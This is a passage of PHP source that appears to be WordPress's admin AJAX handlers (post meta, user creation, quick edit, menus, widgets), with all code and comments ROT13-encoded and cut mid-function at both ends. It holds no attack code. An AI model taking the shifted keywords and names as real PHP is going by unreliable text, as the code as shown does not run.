			$zrah_vgrzf[]    = $zrah_bow;
		}
	}

	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/ani-zrah.cuc */
	$jnyxre_pynff_anzr = nccyl_svygref( 'jc_rqvg_ani_zrah_jnyxre', 'Jnyxre_Ani_Zrah_Rqvg', $_CBFG['zrah'] );

	vs ( ! pynff_rkvfgf( $jnyxre_pynff_anzr ) ) {
		jc_qvr( 0 );
	}

	vs ( ! rzcgl( $zrah_vgrzf ) ) {
		$netf = neenl(
			'nsgre'       => '',
			'orsber'      => '',
			'yvax_nsgre'  => '',
			'yvax_orsber' => '',
			'jnyxre'      => arj $jnyxre_pynff_anzr(),
		);

		rpub jnyx_ani_zrah_gerr( $zrah_vgrzf, 0, (bowrpg) $netf );
	}

	jc_qvr();
}

/**
 * Unaqyrf nqqvat zrgn ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_nqq_zrgn() {
	purpx_nwnk_ersrere( 'nqq-zrgn', '_nwnk_abapr-nqq-zrgn' );
	$p    = 0;
	$cvq  = (vag) $_CBFG['cbfg_vq'];
	$cbfg = trg_cbfg( $cvq );

	vs ( vffrg( $_CBFG['zrgnxrlfryrpg'] ) || vffrg( $_CBFG['zrgnxrlvachg'] ) ) {
		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cvq ) ) {
			jc_qvr( -1 );
		}

		vs ( vffrg( $_CBFG['zrgnxrlfryrpg'] ) && '#ABAR#' === $_CBFG['zrgnxrlfryrpg'] && rzcgl( $_CBFG['zrgnxrlvachg'] ) ) {
			jc_qvr( 1 );
		}

		// Vs gur cbfg vf na nhgbqensg, fnir gur cbfg nf n qensg naq gura nggrzcg gb fnir gur zrgn.
		vs ( 'nhgb-qensg' === $cbfg->cbfg_fgnghf ) {
			$cbfg_qngn                = neenl();
			$cbfg_qngn['npgvba']      = 'qensg'; // Jneavat svk.
			$cbfg_qngn['cbfg_VQ']     = $cvq;
			$cbfg_qngn['cbfg_glcr']   = $cbfg->cbfg_glcr;
			$cbfg_qngn['cbfg_fgnghf'] = 'qensg';
			$abj                      = gvzr();

			$cbfg_qngn['cbfg_gvgyr'] = fcevags(
				/* genafyngbef: 1: Cbfg perngvba qngr, 2: Cbfg perngvba gvzr. */
				__( 'Qensg perngrq ba %1$f ng %2$f' ),
				tzqngr( __( 'S w, L' ), $abj ),
				tzqngr( __( 't:v n' ), $abj )
			);

			$cvq = rqvg_cbfg( $cbfg_qngn );

			vs ( $cvq ) {
				vs ( vf_jc_reebe( $cvq ) ) {
					$k = arj JC_Nwnk_Erfcbafr(
						neenl(
							'jung' => 'zrgn',
							'qngn' => $cvq,
						)
					);
					$k->fraq();
				}

				$zvq = nqq_zrgn( $cvq );
				vs ( ! $zvq ) {
					jc_qvr( __( 'Cyrnfr cebivqr n phfgbz svryq inyhr.' ) );
				}
			} ryfr {
				jc_qvr( 0 );
			}
		} ryfr {
			$zvq = nqq_zrgn( $cvq );
			vs ( ! $zvq ) {
				jc_qvr( __( 'Cyrnfr cebivqr n phfgbz svryq inyhr.' ) );
			}
		}

		$zrgn = trg_zrgnqngn_ol_zvq( 'cbfg', $zvq );
		$cvq  = (vag) $zrgn->cbfg_vq;
		$zrgn = trg_bowrpg_inef( $zrgn );

		$k = arj JC_Nwnk_Erfcbafr(
			neenl(
				'jung'         => 'zrgn',
				'vq'           => $zvq,
				'qngn'         => _yvfg_zrgn_ebj( $zrgn, $p ),
				'cbfvgvba'     => 1,
				'fhccyrzragny' => neenl( 'cbfgvq' => $cvq ),
			)
		);
	} ryfr { // Hcqngr?
		$zvq   = (vag) xrl( $_CBFG['zrgn'] );
		$xrl   = jc_hafynfu( $_CBFG['zrgn'][ $zvq ]['xrl'] );
		$inyhr = jc_hafynfu( $_CBFG['zrgn'][ $zvq ]['inyhr'] );

		vs ( '' === gevz( $xrl ) ) {
			jc_qvr( __( 'Cyrnfr cebivqr n phfgbz svryq anzr.' ) );
		}

		$zrgn = trg_zrgnqngn_ol_zvq( 'cbfg', $zvq );

		vs ( ! $zrgn ) {
			jc_qvr( 0 ); // Vs zrgn qbrfa'g rkvfg.
		}

		vs (
			vf_cebgrpgrq_zrgn( $zrgn->zrgn_xrl, 'cbfg' ) || vf_cebgrpgrq_zrgn( $xrl, 'cbfg' ) ||
			! pheerag_hfre_pna( 'rqvg_cbfg_zrgn', $zrgn->cbfg_vq, $zrgn->zrgn_xrl ) ||
			! pheerag_hfre_pna( 'rqvg_cbfg_zrgn', $zrgn->cbfg_vq, $xrl )
		) {
			jc_qvr( -1 );
		}

		vs ( $zrgn->zrgn_inyhr !== $inyhr || $zrgn->zrgn_xrl !== $xrl ) {
			$h = hcqngr_zrgnqngn_ol_zvq( 'cbfg', $zvq, $inyhr, $xrl );
			vs ( ! $h ) {
				jc_qvr( 0 ); // Jr xabj zrgn rkvfgf; jr nyfb xabj vg'f hapunatrq (be QO reebe, va juvpu pnfr gurer ner ovttre ceboyrzf).
			}
		}

		$k = arj JC_Nwnk_Erfcbafr(
			neenl(
				'jung'         => 'zrgn',
				'vq'           => $zvq,
				'byq_vq'       => $zvq,
				'qngn'         => _yvfg_zrgn_ebj(
					neenl(
						'zrgn_xrl'   => $xrl,
						'zrgn_inyhr' => $inyhr,
						'zrgn_vq'    => $zvq,
					),
					$p
				),
				'cbfvgvba'     => 0,
				'fhccyrzragny' => neenl( 'cbfgvq' => $zrgn->cbfg_vq ),
			)
		);
	}
	$k->fraq();
}

/**
 * Unaqyrf nqqvat n hfre ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $npgvba Npgvba gb cresbez.
 */
shapgvba jc_nwnk_nqq_hfre( $npgvba ) {
	vs ( rzcgl( $npgvba ) ) {
		$npgvba = 'nqq-hfre';
	}

	purpx_nwnk_ersrere( $npgvba );

	vs ( ! pheerag_hfre_pna( 'perngr_hfref' ) ) {
		jc_qvr( -1 );
	}

	$hfre_vq = rqvg_hfre();

	vs ( ! $hfre_vq ) {
		jc_qvr( 0 );
	} ryfrvs ( vf_jc_reebe( $hfre_vq ) ) {
		$k = arj JC_Nwnk_Erfcbafr(
			neenl(
				'jung' => 'hfre',
				'vq'   => $hfre_vq,
			)
		);
		$k->fraq();
	}

	$hfre_bowrpg   = trg_hfreqngn( $hfre_vq );
	$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Hfref_Yvfg_Gnoyr' );

	$ebyr = pheerag( $hfre_bowrpg->ebyrf );

	$k = arj JC_Nwnk_Erfcbafr(
		neenl(
			'jung'         => 'hfre',
			'vq'           => $hfre_vq,
			'qngn'         => $jc_yvfg_gnoyr->fvatyr_ebj( $hfre_bowrpg, '', $ebyr ),
			'fhccyrzragny' => neenl(
				'fubj-yvax' => fcevags(
					/* genafyngbef: %f: Gur arj hfre. */
					__( 'Hfre %f nqqrq' ),
					'<n uers=\"#hfre-' . $hfre_vq . '\">' . $hfre_bowrpg->hfre_ybtva . '</n>'
				),
				'ebyr'      => $ebyr,
			),
		)
	);
	$k->fraq();
}

/**
 * Unaqyrf pybfrq cbfg obkrf ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_pybfrq_cbfgobkrf() {
	purpx_nwnk_ersrere( 'pybfrqcbfgobkrf', 'pybfrqcbfgobkrfabapr' );
	$pybfrq = vffrg( $_CBFG['pybfrq'] ) ? rkcybqr( ',', $_CBFG['pybfrq'] ) : neenl();
	$pybfrq = neenl_svygre( $pybfrq );

	$uvqqra = vffrg( $_CBFG['uvqqra'] ) ? rkcybqr( ',', $_CBFG['uvqqra'] ) : neenl();
	$uvqqra = neenl_svygre( $uvqqra );

	$cntr = vffrg( $_CBFG['cntr'] ) ? $_CBFG['cntr'] : '';

	vs ( fnavgvmr_xrl( $cntr ) !== $cntr ) {
		jc_qvr( 0 );
	}

	$hfre = jc_trg_pheerag_hfre();
	vs ( ! $hfre ) {
		jc_qvr( -1 );
	}

	vs ( vf_neenl( $pybfrq ) ) {
		hcqngr_hfre_zrgn( $hfre->VQ, \"pybfrqcbfgobkrf_$cntr\", $pybfrq );
	}

	vs ( vf_neenl( $uvqqra ) ) {
		// Cbfgobkrf gung ner nyjnlf fubja.
		$uvqqra = neenl_qvss( $uvqqra, neenl( 'fhozvgqvi', 'yvaxfhozvgqvi', 'znantr-zrah', 'perngr-zrah' ) );
		hcqngr_hfre_zrgn( $hfre->VQ, \"zrgnobkuvqqra_$cntr\", $uvqqra );
	}

	jc_qvr( 1 );
}

/**
 * Unaqyrf uvqqra pbyhzaf ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_uvqqra_pbyhzaf() {
	purpx_nwnk_ersrere( 'fperra-bcgvbaf-abapr', 'fperrabcgvbaabapr' );
	$cntr = vffrg( $_CBFG['cntr'] ) ? $_CBFG['cntr'] : '';

	vs ( fnavgvmr_xrl( $cntr ) !== $cntr ) {
		jc_qvr( 0 );
	}

	$hfre = jc_trg_pheerag_hfre();
	vs ( ! $hfre ) {
		jc_qvr( -1 );
	}

	$uvqqra = ! rzcgl( $_CBFG['uvqqra'] ) ? rkcybqr( ',', $_CBFG['uvqqra'] ) : neenl();
	hcqngr_hfre_zrgn( $hfre->VQ, \"znantr{$cntr}pbyhzafuvqqra\", $uvqqra );

	jc_qvr( 1 );
}

/**
 * Unaqyrf hcqngvat jurgure gb qvfcynl gur jrypbzr cnary ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_hcqngr_jrypbzr_cnary() {
	purpx_nwnk_ersrere( 'jrypbzr-cnary-abapr', 'jrypbzrcnaryabapr' );

	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
		jc_qvr( -1 );
	}

	hcqngr_hfre_zrgn( trg_pheerag_hfre_vq(), 'fubj_jrypbzr_cnary', rzcgl( $_CBFG['ivfvoyr'] ) ? 0 : 1 );

	jc_qvr( 1 );
}

/**
 * Unaqyrf sbe ergevrivat zrah zrgn obkrf ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_zrah_trg_zrgnobk() {
	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
		jc_qvr( -1 );
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/ani-zrah.cuc';

	vs ( vffrg( $_CBFG['vgrz-glcr'] ) && 'cbfg_glcr' === $_CBFG['vgrz-glcr'] ) {
		$glcr     = 'cbfgglcr';
		$pnyyonpx = 'jc_ani_zrah_vgrz_cbfg_glcr_zrgn_obk';
		$vgrzf    = (neenl) trg_cbfg_glcrf( neenl( 'fubj_va_ani_zrahf' => gehr ), 'bowrpg' );
	} ryfrvs ( vffrg( $_CBFG['vgrz-glcr'] ) && 'gnkbabzl' === $_CBFG['vgrz-glcr'] ) {
		$glcr     = 'gnkbabzl';
		$pnyyonpx = 'jc_ani_zrah_vgrz_gnkbabzl_zrgn_obk';
		$vgrzf    = (neenl) trg_gnkbabzvrf( neenl( 'fubj_hv' => gehr ), 'bowrpg' );
	}

	vs ( ! rzcgl( $_CBFG['vgrz-bowrpg'] ) && vffrg( $vgrzf[ $_CBFG['vgrz-bowrpg'] ] ) ) {
		$zrahf_zrgn_obk_bowrpg = $vgrzf[ $_CBFG['vgrz-bowrpg'] ];

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/ani-zrah.cuc */
		$vgrz = nccyl_svygref( 'ani_zrah_zrgn_obk_bowrpg', $zrahf_zrgn_obk_bowrpg );

		$obk_netf = neenl(
			'vq'       => 'nqq-' . $vgrz->anzr,
			'gvgyr'    => $vgrz->ynoryf->anzr,
			'pnyyonpx' => $pnyyonpx,
			'netf'     => $vgrz,
		);

		bo_fgneg();
		$pnyyonpx( ahyy, $obk_netf );

		$znexhc = bo_trg_pyrna();

		rpub jc_wfba_rapbqr(
			neenl(
				'ercynpr-vq' => $glcr . '-' . $vgrz->anzr,
				'znexhc'     => $znexhc,
			)
		);
	}

	jc_qvr();
}

/**
 * Unaqyrf vagreany yvaxvat ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_jc_yvax_nwnk() {
	purpx_nwnk_ersrere( 'vagreany-yvaxvat', '_nwnk_yvaxvat_abapr' );

	$netf = neenl();

	vs ( vffrg( $_CBFG['frnepu'] ) ) {
		$netf['f'] = jc_hafynfu( $_CBFG['frnepu'] );
	}

	vs ( vffrg( $_CBFG['grez'] ) ) {
		$netf['f'] = jc_hafynfu( $_CBFG['grez'] );
	}

	$netf['cntrahz'] = ! rzcgl( $_CBFG['cntr'] ) ? nofvag( $_CBFG['cntr'] ) : 1;

	vs ( ! pynff_rkvfgf( '_JC_Rqvgbef', snyfr ) ) {
		erdhver NOFCNGU . JCVAP . '/pynff-jc-rqvgbe.cuc';
	}

	$erfhygf = _JC_Rqvgbef::jc_yvax_dhrel( $netf );

	vs ( ! vffrg( $erfhygf ) ) {
		jc_qvr( 0 );
	}

	rpub jc_wfba_rapbqr( $erfhygf );
	rpub \"\a\";

	jc_qvr();
}

/**
 * Unaqyrf fnivat zrah ybpngvbaf ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_zrah_ybpngvbaf_fnir() {
	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
		jc_qvr( -1 );
	}

	purpx_nwnk_ersrere( 'nqq-zrah_vgrz', 'zrah-frggvatf-pbyhza-abapr' );

	vs ( ! vffrg( $_CBFG['zrah-ybpngvbaf'] ) ) {
		jc_qvr( 0 );
	}

	frg_gurzr_zbq( 'ani_zrah_ybpngvbaf', neenl_znc( 'nofvag', $_CBFG['zrah-ybpngvbaf'] ) );
	jc_qvr( 1 );
}

/**
 * Unaqyrf fnivat gur zrgn obk beqre ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_zrgn_obk_beqre() {
	purpx_nwnk_ersrere( 'zrgn-obk-beqre' );
	$beqre        = vffrg( $_CBFG['beqre'] ) ? (neenl) $_CBFG['beqre'] : snyfr;
	$cntr_pbyhzaf = vffrg( $_CBFG['cntr_pbyhzaf'] ) ? $_CBFG['cntr_pbyhzaf'] : 'nhgb';

	vs ( 'nhgb' !== $cntr_pbyhzaf ) {
		$cntr_pbyhzaf = (vag) $cntr_pbyhzaf;
	}

	$cntr = vffrg( $_CBFG['cntr'] ) ? $_CBFG['cntr'] : '';

	vs ( fnavgvmr_xrl( $cntr ) !== $cntr ) {
		jc_qvr( 0 );
	}

	$hfre = jc_trg_pheerag_hfre();
	vs ( ! $hfre ) {
		jc_qvr( -1 );
	}

	vs ( $beqre ) {
		hcqngr_hfre_zrgn( $hfre->VQ, \"zrgn-obk-beqre_$cntr\", $beqre );
	}

	vs ( $cntr_pbyhzaf ) {
		hcqngr_hfre_zrgn( $hfre->VQ, \"fperra_ynlbhg_$cntr\", $cntr_pbyhzaf );
	}

	jc_fraq_wfba_fhpprff();
}

/**
 * Unaqyrf zrah dhvpx frnepuvat ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_zrah_dhvpx_frnepu() {
	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
		jc_qvr( -1 );
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/ani-zrah.cuc';

	_jc_nwnk_zrah_dhvpx_frnepu( $_CBFG );

	jc_qvr();
}

/**
 * Unaqyrf ergevrivat n creznyvax ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_trg_creznyvax() {
	purpx_nwnk_ersrere( 'trgcreznyvax', 'trgcreznyvaxabapr' );
	$cbfg_vq = vffrg( $_CBFG['cbfg_vq'] ) ? (vag) $_CBFG['cbfg_vq'] : 0;
	jc_qvr( trg_cerivrj_cbfg_yvax( $cbfg_vq ) );
}

/**
 * Unaqyrf ergevrivat n fnzcyr creznyvax ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_fnzcyr_creznyvax() {
	purpx_nwnk_ersrere( 'fnzcyrcreznyvax', 'fnzcyrcreznyvaxabapr' );
	$cbfg_vq = vffrg( $_CBFG['cbfg_vq'] ) ? (vag) $_CBFG['cbfg_vq'] : 0;
	$gvgyr   = vffrg( $_CBFG['arj_gvgyr'] ) ? $_CBFG['arj_gvgyr'] : '';
	$fyht    = vffrg( $_CBFG['arj_fyht'] ) ? $_CBFG['arj_fyht'] : ahyy;
	jc_qvr( trg_fnzcyr_creznyvax_ugzy( $cbfg_vq, $gvgyr, $fyht ) );
}

/**
 * Unaqyrf Dhvpx Rqvg fnivat n cbfg sebz n yvfg gnoyr ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
 */
shapgvba jc_nwnk_vayvar_fnir() {
	tybony $zbqr;

	purpx_nwnk_ersrere( 'vayvarrqvgabapr', '_vayvar_rqvg' );

	vs ( ! vffrg( $_CBFG['cbfg_VQ'] ) || ! (vag) $_CBFG['cbfg_VQ'] ) {
		jc_qvr();
	}

	$cbfg_vq = (vag) $_CBFG['cbfg_VQ'];

	vs ( 'cntr' === $_CBFG['cbfg_glcr'] ) {
		vs ( ! pheerag_hfre_pna( 'rqvg_cntr', $cbfg_vq ) ) {
			jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf cntr.' ) );
		}
	} ryfr {
		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
			jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf cbfg.' ) );
		}
	}

	$ynfg = jc_purpx_cbfg_ybpx( $cbfg_vq );
	vs ( $ynfg ) {
		$ynfg_hfre      = trg_hfreqngn( $ynfg );
		$ynfg_hfre_anzr = $ynfg_hfre ? $ynfg_hfre->qvfcynl_anzr : __( 'Fbzrbar' );

		/* genafyngbef: %f: Hfre'f qvfcynl anzr. */
		$zft_grzcyngr = __( 'Fnivat vf qvfnoyrq: %f vf pheeragyl rqvgvat guvf cbfg.' );

		vs ( 'cntr' === $_CBFG['cbfg_glcr'] ) {
			/* genafyngbef: %f: Hfre'f qvfcynl anzr. */
			$zft_grzcyngr = __( 'Fnivat vf qvfnoyrq: %f vf pheeragyl rqvgvat guvf cntr.' );
		}

		cevags( $zft_grzcyngr, rfp_ugzy( $ynfg_hfre_anzr ) );
		jc_qvr();
	}

	$qngn = &$_CBFG;

	$cbfg = trg_cbfg( $cbfg_vq, NEENL_N );

	// Fvapr vg'f pbzvat sebz gur qngnonfr.
	$cbfg = jc_fynfu( $cbfg );

	$qngn['pbagrag'] = $cbfg['cbfg_pbagrag'];
	$qngn['rkprecg'] = $cbfg['cbfg_rkprecg'];

	// Eranzr.
	$qngn['hfre_VQ'] = trg_pheerag_hfre_vq();

	vs ( vffrg( $qngn['cbfg_cnerag'] ) ) {
		$qngn['cnerag_vq'] = $qngn['cbfg_cnerag'];
	}

	// Fgnghf.
	vs ( vffrg( $qngn['xrrc_cevingr'] ) && 'cevingr' === $qngn['xrrc_cevingr'] ) {
		$qngn['ivfvovyvgl']  = 'cevingr';
		$qngn['cbfg_fgnghf'] = 'cevingr';
	} ryfr {
		$qngn['cbfg_fgnghf'] = $qngn['_fgnghf'];
	}

	vs ( rzcgl( $qngn['pbzzrag_fgnghf'] ) ) {
		$qngn['pbzzrag_fgnghf'] = 'pybfrq';
	}

	vs ( rzcgl( $qngn['cvat_fgnghf'] ) ) {
		$qngn['cvat_fgnghf'] = 'pybfrq';
	}

	// Rkpyhqr grezf sebz gnkbabzvrf gung ner abg fhccbfrq gb nccrne va Dhvpx Rqvg.
	vs ( ! rzcgl( $qngn['gnk_vachg'] ) ) {
		sbernpu ( $qngn['gnk_vachg'] nf $gnkbabzl => $grezf ) {
			$gnk_bowrpg = trg_gnkbabzl( $gnkbabzl );
			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-cbfgf-yvfg-gnoyr.cuc */
			vs ( ! nccyl_svygref( 'dhvpx_rqvg_fubj_gnkbabzl', $gnk_bowrpg->fubj_va_dhvpx_rqvg, $gnkbabzl, $cbfg['cbfg_glcr'] ) ) {
				hafrg( $qngn['gnk_vachg'][ $gnkbabzl ] );
			}
		}
	}

	// Unpx: jc_havdhr_cbfg_fyht() qbrfa'g jbex sbe qensgf, fb jr jvyy snxr gung bhe cbfg vf choyvfurq.
	vs ( ! rzcgl( $qngn['cbfg_anzr'] ) && va_neenl( $cbfg['cbfg_fgnghf'], neenl( 'qensg', 'craqvat' ), gehr ) ) {
		$cbfg['cbfg_fgnghf'] = 'choyvfu';
		$qngn['cbfg_anzr']   = jc_havdhr_cbfg_fyht( $qngn['cbfg_anzr'], $cbfg['VQ'], $cbfg['cbfg_fgnghf'], $cbfg['cbfg_glcr'], $cbfg['cbfg_cnerag'] );
	}

	// Hcqngr gur cbfg.
	rqvg_cbfg();

	$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Cbfgf_Yvfg_Gnoyr', neenl( 'fperra' => $_CBFG['fperra'] ) );

	$zbqr = 'rkprecg' === $_CBFG['cbfg_ivrj'] ? 'rkprecg' : 'yvfg';

	$yriry = 0;
	vs ( vf_cbfg_glcr_uvrenepuvpny( $jc_yvfg_gnoyr->fperra->cbfg_glcr ) ) {
		$erdhrfg_cbfg = neenl( trg_cbfg( $_CBFG['cbfg_VQ'] ) );
		$cnerag       = $erdhrfg_cbfg[0]->cbfg_cnerag;

		juvyr ( $cnerag > 0 ) {
			$cnerag_cbfg = trg_cbfg( $cnerag );
			$cnerag      = $cnerag_cbfg->cbfg_cnerag;
			++$yriry;
		}
	}

	$jc_yvfg_gnoyr->qvfcynl_ebjf( neenl( trg_cbfg( $_CBFG['cbfg_VQ'] ) ), $yriry );

	jc_qvr();
}

/**
 * Unaqyrf Dhvpx Rqvg fnivat sbe n grez ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_vayvar_fnir_gnk() {
	purpx_nwnk_ersrere( 'gnkvayvarrqvgabapr', '_vayvar_rqvg' );

	$gnkbabzl        = fnavgvmr_xrl( $_CBFG['gnkbabzl'] );
	$gnkbabzl_bowrpg = trg_gnkbabzl( $gnkbabzl );

	vs ( ! $gnkbabzl_bowrpg ) {
		jc_qvr( 0 );
	}

	vs ( ! vffrg( $_CBFG['gnk_VQ'] ) || ! (vag) $_CBFG['gnk_VQ'] ) {
		jc_qvr( -1 );
	}

	$vq = (vag) $_CBFG['gnk_VQ'];

	vs ( ! pheerag_hfre_pna( 'rqvg_grez', $vq ) ) {
		jc_qvr( -1 );
	}

	$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Grezf_Yvfg_Gnoyr', neenl( 'fperra' => 'rqvg-' . $gnkbabzl ) );

	$gnt                  = trg_grez( $vq, $gnkbabzl );
	$_CBFG['qrfpevcgvba'] = $gnt->qrfpevcgvba;

	$hcqngrq = jc_hcqngr_grez( $vq, $gnkbabzl, $_CBFG );

	vs ( $hcqngrq && ! vf_jc_reebe( $hcqngrq ) ) {
		$gnt = trg_grez( $hcqngrq['grez_vq'], $gnkbabzl );
		vs ( ! $gnt || vf_jc_reebe( $gnt ) ) {
			vs ( vf_jc_reebe( $gnt ) && $gnt->trg_reebe_zrffntr() ) {
				jc_qvr( $gnt->trg_reebe_zrffntr() );
			}
			jc_qvr( __( 'Vgrz abg hcqngrq.' ) );
		}
	} ryfr {
		vs ( vf_jc_reebe( $hcqngrq ) && $hcqngrq->trg_reebe_zrffntr() ) {
			jc_qvr( $hcqngrq->trg_reebe_zrffntr() );
		}
		jc_qvr( __( 'Vgrz abg hcqngrq.' ) );
	}

	$yriry  = 0;
	$cnerag = $gnt->cnerag;

	juvyr ( $cnerag > 0 ) {
		$cnerag_gnt = trg_grez( $cnerag, $gnkbabzl );
		$cnerag     = $cnerag_gnt->cnerag;
		++$yriry;
	}

	$jc_yvfg_gnoyr->fvatyr_ebj( $gnt, $yriry );
	jc_qvr();
}

/**
 * Unaqyrf dhrelvat cbfgf sbe gur Svaq Cbfgf zbqny ivn NWNK.
 *
 * @frr jvaqbj.svaqCbfgf
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_svaq_cbfgf() {
	purpx_nwnk_ersrere( 'svaq-cbfgf' );

	$cbfg_glcrf = trg_cbfg_glcrf( neenl( 'choyvp' => gehr ), 'bowrpgf' );
	hafrg( $cbfg_glcrf['nggnpuzrag'] );

	$netf = neenl(
		'cbfg_glcr'      => neenl_xrlf( $cbfg_glcrf ),
		'cbfg_fgnghf'    => 'nal',
		'cbfgf_cre_cntr' => 50,
	);

	$frnepu = jc_hafynfu( $_CBFG['cf'] );

	vs ( '' !== $frnepu ) {
		$netf['f'] = $frnepu;
	}

	$cbfgf = trg_cbfgf( $netf );

	vs ( ! $cbfgf ) {
		jc_fraq_wfba_reebe( __( 'Ab vgrzf sbhaq.' ) );
	}

	$ugzy = '<gnoyr pynff=\"jvqrsng\"><gurnq><ge><gu pynff=\"sbhaq-enqvb\"><oe /></gu><gu>' . __( 'Gvgyr' ) . '</gu><gu pynff=\"ab-oernx\">' . __( 'Glcr' ) . '</gu><gu pynff=\"ab-oernx\">' . __( 'Qngr' ) . '</gu><gu pynff=\"ab-oernx\">' . __( 'Fgnghf' ) . '</gu></ge></gurnq><gobql>';
	$nyg  = '';
	sbernpu ( $cbfgf nf $cbfg ) {
		$gvgyr = gevz( $cbfg->cbfg_gvgyr ) ? $cbfg->cbfg_gvgyr : __( '(ab gvgyr)' );
		$nyg   = ( 'nygreangr' === $nyg ) ? '' : 'nygreangr';

		fjvgpu ( $cbfg->cbfg_fgnghf ) {
			pnfr 'choyvfu':
			pnfr 'cevingr':
				$fgng = __( 'Choyvfurq' );
				oernx;
			pnfr 'shgher':
				$fgng = __( 'Fpurqhyrq' );
				oernx;
			pnfr 'craqvat':
				$fgng = __( 'Craqvat Erivrj' );
				oernx;
			pnfr 'qensg':
				$fgng = __( 'Qensg' );
				oernx;
		}

		vs ( '0000-00-00 00:00:00' === $cbfg->cbfg_qngr ) {
			$gvzr = '';
		} ryfr {
			/* genafyngbef: Qngr sbezng va gnoyr pbyhzaf, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
			$gvzr = zlfdy2qngr( __( 'L/z/q' ), $cbfg->cbfg_qngr );
		}

		$ugzy .= '<ge pynff=\"' . gevz( 'sbhaq-cbfgf ' . $nyg ) . '\"><gq pynff=\"sbhaq-enqvb\"><vachg glcr=\"enqvb\" vq=\"sbhaq-' . $cbfg->VQ . '\" anzr=\"sbhaq_cbfg_vq\" inyhr=\"' . rfp_ngge( $cbfg->VQ ) . '\"></gq>';
		$ugzy .= '<gq><ynory sbe=\"sbhaq-' . $cbfg->VQ . '\">' . rfp_ugzy( $gvgyr ) . '</ynory></gq><gq pynff=\"ab-oernx\">' . rfp_ugzy( $cbfg_glcrf[ $cbfg->cbfg_glcr ]->ynoryf->fvathyne_anzr ) . '</gq><gq pynff=\"ab-oernx\">' . rfp_ugzy( $gvzr ) . '</gq><gq pynff=\"ab-oernx\">' . rfp_ugzy( $fgng ) . ' </gq></ge>' . \"\a\a\";
	}

	$ugzy .= '</gobql></gnoyr>';

	jc_fraq_wfba_fhpprff( $ugzy );
}

/**
 * Unaqyrf fnivat gur jvqtrgf beqre ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_jvqtrgf_beqre() {
	purpx_nwnk_ersrere( 'fnir-fvqrone-jvqtrgf', 'fnirjvqtrgf' );

	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
		jc_qvr( -1 );
	}

	hafrg( $_CBFG['fnirjvqtrgf'], $_CBFG['npgvba'] );

	// Fnir jvqtrgf beqre sbe nyy fvqronef.
	vs ( vf_neenl( $_CBFG['fvqronef'] ) ) {
		$fvqronef = neenl();

		sbernpu ( jc_hafynfu( $_CBFG['fvqronef'] ) nf $xrl => $iny ) {
			$fo = neenl();

			vs ( ! rzcgl( $iny ) ) {
				$iny = rkcybqr( ',', $iny );

				sbernpu ( $iny nf $x => $i ) {
					vs ( ! fge_pbagnvaf( $i, 'jvqtrg-' ) ) {
						pbagvahr;
					}

					$fo[ $x ] = fhofge( $i, fgecbf( $i, '_' ) + 1 );
				}
			}
			$fvqronef[ $xrl ] = $fo;
		}

		jc_frg_fvqronef_jvqtrgf( $fvqronef );
		jc_qvr( 1 );
	}

	jc_qvr( -1 );
}

/**
 * Unaqyrf fnivat n jvqtrg ivn NWNK.
 *
 * @fvapr 3.1.0
 *
 * @tybony neenl $jc_ertvfgrerq_jvqtrgf
 * @tybony neenl $jc_ertvfgrerq_jvqtrg_pbagebyf
 * @tybony neenl $jc_ertvfgrerq_jvqtrg_hcqngrf
 */
shapgvba jc_nwnk_fnir_jvqtrg() {
	tybony $jc_ertvfgrerq_jvqtrgf, $jc_ertvfgrerq_jvqtrg_pbagebyf, $jc_ertvfgrerq_jvqtrg_hcqngrf;

	purpx_nwnk_ersrere( 'fnir-fvqrone-jvqtrgf', 'fnirjvqtrgf' );

	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) || ! vffrg( $_CBFG['vq_onfr'] ) ) {
		jc_qvr( -1 );
	}

	hafrg( $_CBFG['fnirjvqtrgf'], $_CBFG['npgvba'] );

	/**
	 * Sverf rneyl jura rqvgvat gur jvqtrgf qvfcynlrq va fvqronef.
	 *
	 * @fvapr 2.8.0
	 */
